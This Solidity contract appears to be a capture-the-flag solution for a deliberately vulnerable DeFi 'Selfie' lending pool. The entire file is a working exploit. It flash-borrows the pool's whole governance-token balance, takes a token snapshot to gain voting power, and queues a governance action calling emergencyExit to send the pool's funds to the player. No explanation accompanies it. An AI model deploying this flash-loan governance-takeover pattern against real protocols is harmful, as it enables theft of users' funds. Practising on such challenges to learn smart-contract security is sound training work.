// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ISimpleGovernance} from "../selfie/ISimpleGovernance.sol";

interface ISelfiePool {
    function flashLoan(
        address _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns (bool);

    function emergencyExit(address receiver) external;
}

interface IGovToken {
    function snapshot() external returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
}

contract Attack6 {
    ISimpleGovernance private immutable simpleGovernance;
    ISelfiePool private immutable selfiePool;
    IGovToken public immutable governanceToken;
    address private immutable player;

    constructor(
        address _simpleGovernance,
        address _selfiePool,
        address _governanceToken,
        address _player
    ) {
        simpleGovernance = ISimpleGovernance(_simpleGovernance);
        selfiePool = ISelfiePool(_selfiePool);
        governanceToken = IGovToken(_governanceToken);
        player = _player;
    }

    function attack() external {
        uint256 amount = governanceToken.balanceOf(address(selfiePool));
        selfiePool.flashLoan(
            address(this),
            address(governanceToken),
            amount,
            ""
        );
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        governanceToken.snapshot();
        governanceToken.approve(address(selfiePool), amount);

        simpleGovernance.queueAction(
            address(selfiePool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", player)
        );

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
